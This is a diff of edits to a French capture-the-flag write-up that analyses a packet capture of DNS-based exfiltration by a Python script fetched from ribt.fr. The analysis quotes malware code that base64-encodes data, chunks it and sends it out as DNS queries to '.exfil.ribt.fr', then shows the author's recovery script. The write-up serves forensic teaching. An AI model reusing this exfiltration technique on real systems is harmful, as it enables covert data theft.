@@ -19,7 +19,7 @@ On télécharge le fichier fourni, sobrement intitulé **capture.pcapng**, on ga
 
 Et hop, on a notre fichier tout propre tout beau, que Wireshark peut lire.
 On ouvre donc le fichier, et puis là... On est assez surpris par la longueur du fichier.
-La capture fait 7491 trames, principalement des trames DNS. Une première intuition me fait dire que la plus grosse partie du challenge se déroulera là. Ensuite, nous avons au début quelque chose que j'interprète comme l'initialisation de quelque chose. Et là, détail me saute aux yeux : un GET de /malware.py, provenant du site ribt.fr sur le port 8000.
+La capture fait 7491 trames, principalement des trames DNS. Une première intuition me fait dire que la plus grosse partie du challenge se déroulera là. Ensuite, nous avons au début quelque chose que j'interprète comme l'initialisation de quelque chose. Et là, détail me saute aux yeux : un GET de /malware.py, provenant du site `ribt.fr` sur le port `8000`.
 
  ![Pas_discret](https://cdn.discordapp.com/attachments/822188888297963560/1173656521385705573/Capture_decran_24.png?ex=6564bfd0&is=65524ad0&hm=45274245d1a8992fc45430afab53f765d6d829bd0151cd1ae27d600e1b3b9a4b&){: .mx-auto.d-block :}
 
@@ -52,8 +52,8 @@ encoded = base64.urlsafe_b64encode(data).decode().rstrip("=")
 chunks = [encoded[i:i+63] for i in range(0, len(encoded), 63)]
 ```
 
-Ce morceau de code, qui paraît barbare, est en fait assez simple à comprendre. Nos données, précédemment stockées dans data, sont encodées en base64 (qui je le rappelle n'est pas un mécanisme de chiffrement, pour éviter de vous faire taper par des fans de crypto).
-Après, les données encodées sont séparées en morceaux de 63 dans cette liste par compréhension. En gros, cela découpe les données encodées en base64 en morceaux de taille similaire. C'est tout pour cette partie, on passe à la suivante.
+Ce morceau de code, qui paraît barbare, est en fait assez simple à comprendre. Nos données, précédemment stockées dans data, sont encodées en base64 (qui je le rappelle n'est pas un mécanisme de chiffrement, pour éviter de vous faire taper par des gourous de crypto).
+Après, les données encodées sont séparées en morceaux de 63 caractères dans la liste par compréhension `chunks`. En gros, cela découpe les données encodées en base64 en morceaux de taille similaire. C'est tout pour cette partie, on passe à la suivante.
 
 ```python
 queries = [chunk + '.exfil.ribt.fr' for chunk in chunks]
@@ -64,11 +64,11 @@ for i in range(len(queries)):
         pass
 ```
 
-Ici, on se reprend une petite liste par compréhension, qui ajoute juste les morceaux qui avaient été faits avant à `.exfil.ribt.fr`. Tiens... Ca ressemble étrangement à ce qu'on a pu voir dans les requêtes DNS... Etrange. Notre intuition est par la suite confirmée. En gros, le programme tente de résoudre le nom de domaine `{indice de l'itération}.{data encodée en base64}.exfil.ribt.fr` pour trouver l'adresse IP. Mais c'est juste un moyen pour récupérer les données et les envoyer vers le serveur. Sûrement à des fins purement éducatives. Hum hum.
-Mais nous avons fini l'analyse de notre malware. Maintenant, passons à la phase que je préfère (c'est faux) : le scripting. En utilisant bien sûr le langage aimé de tous, le bien nommé python.
+Ici, on se reprend une petite liste par compréhension nommée `queries`, qui ajoute juste les morceaux qui avaient été faits avant à `.exfil.ribt.fr`. Tiens... Ca ressemble étrangement à ce qu'on a pu voir dans les requêtes DNS... Etrange. Notre intuition est par la suite confirmée. En gros, le programme tente de résoudre le nom de domaine `{indice de l'itération}.{data encodée en base64}.exfil.ribt.fr` pour trouver l'adresse IP. Mais c'est juste un moyen de récupérer les données et de les envoyer vers le serveur pour recevoir les datas exfiltrées. Sûrement à des fins purement éducatives... Hum hum.
+Nous en avons (enfin) fini avec l'analyse de notre malware. Maintenant, passons à la phase que je préfère (c'est faux) : le scripting. En utilisant bien sûr le langage aimé de tous, le bien nommé python.
 
 ## Scripting
-Par paresse, parce que je ne voulais de manipuler le fichier pour récupérer toutes les trames DNS, j'ai fait un :
+Par paresse, et aussi parce que je ne voulais de manipuler le fichier pour récupérer toutes les trames DNS, j'ai fait un :
 ```console
 blackraven@blackraven:~$ strings capture.pcapng > data.txt
 ```
@@ -87,7 +87,7 @@ with open("data_exfiltred.txt", 'rb') as flag:
     data = flag.read().split(b"\n")
 ```
 
-Nous cherchons maintenant les données commençant par un nombre, suivi d'un point, lui-même suivi de texte. Mais comment faire ? Et bien avec des regex ! Les regex sauvent la vie, et sont très utiles dans pas mal de situations. Y compris celle-ci. Sauf que y'a théorie et pratique. En pratique, j'avais complétement oublié comment ça marchait. Alors le site [regex101](https://regex101.com) m'a bien sauvé la vie pour tester les regex.
+Nous cherchons maintenant les données commençant par un nombre, suivi d'un point, lui-même suivi de texte. Mais comment faire ? Et bien avec des regex ! Les regex sauvent la vie, et sont très utiles dans pas mal de situations. Y compris celle-ci. Sauf que qu'il y a théorie et pratique. En pratique, j'avais complétement oublié comment ça marchait. Alors le site [regex101](https://regex101.com) m'a bien sauvé la vie pour tester les regex (et StackOverflow aussi, pour rendre à César ce qui est à César).
 ![Oskour](https://cdn.discordapp.com/attachments/822188888297963560/1173701549474717796/85wglo.jpg?ex=6564e9bf&is=655274bf&hm=8a32193bae193d19c575ee9a7892a8435e380977c24913426b9b297eeb6659bb&){: .mx-auto.d-block :}
 Une fois cette difficulté passée, le filtre devient assez simple à coder.
 ```python
@@ -120,8 +120,9 @@ flag += b"=" * (4 - len(flag_encoded) % 4)
 decoded_data = base64.urlsafe_b64decode(flag)
 print(decoded_data)
 ```
+
 {: .box-note}
-**Note:** Important : Comment ai-je su que c'était un .jpg ? J'ai juste décodé le premier chunk. J'ai ainsi pu voir les magic bytes caractéristiques des jpeg : ffd8 ffe0 0010 4a46 4946 0001
+**Note:** Important : Comment ai-je su que c'était un .jpg ? J'ai juste décodé le premier chunk. J'ai ainsi pu voir les magic bytes caractéristiques des jpeg : `ffd8 ffe0 0010 4a46 4946 0001`
 
 Après je fais un :
 ```console
